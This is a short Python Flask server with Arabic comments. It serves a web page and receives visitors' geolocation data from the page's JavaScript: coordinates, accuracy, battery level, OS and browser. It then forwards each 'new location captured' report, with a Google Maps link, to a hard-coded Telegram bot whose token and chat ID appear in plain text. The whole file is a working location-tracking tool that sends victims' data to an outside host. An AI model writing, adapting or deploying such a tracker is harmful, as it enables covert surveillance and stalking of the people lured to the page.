from flask import Flask, request, render_template
import requests

app = Flask(__name__)

# إعدادات البوت
BOT_TOKEN = '7961048427:AAFjlXzCR9F7W4QK2k4S5Iw3COnZlbtlq4Y'
CHAT_ID = '1208587005'

# دالة إرسال رسالة لتلقرام
def send_to_telegram(message):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    payload = {'chat_id': CHAT_ID, 'text': message}
    requests.post(url, data=payload)

# الصفحة الرئيسية
@app.route('/')
def index():
    return render_template('index.html')  # تأكد أن عندك index.html داخل مجلد templates

# استقبال النتائج من الجافاسكربت
@app.route('/result', methods=['POST'])
def result():
    data = request.json

    # إعداد الرسالة
    location_data = f"""📍 موقع جديد تم التقاطه:

🔸 الإحداثيات: {data.get('lat')}, {data.get('lon')}
🌐 رابط مباشر: https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}

🕒 الوقت: {data.get('timestamp')}
📶 الدقة: {data.get('accuracy')} متر
🔋 البطارية: {data.get('battery')}%
📱 النظام: {data.get('os')} | المتصفح: {data.get('browser')}
"""

    print(location_data)  # يظهر في الكونسول على Render
    send_to_telegram(location_data)
    return 'OK'

# تشغيل التطبيق على بورت 5000
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
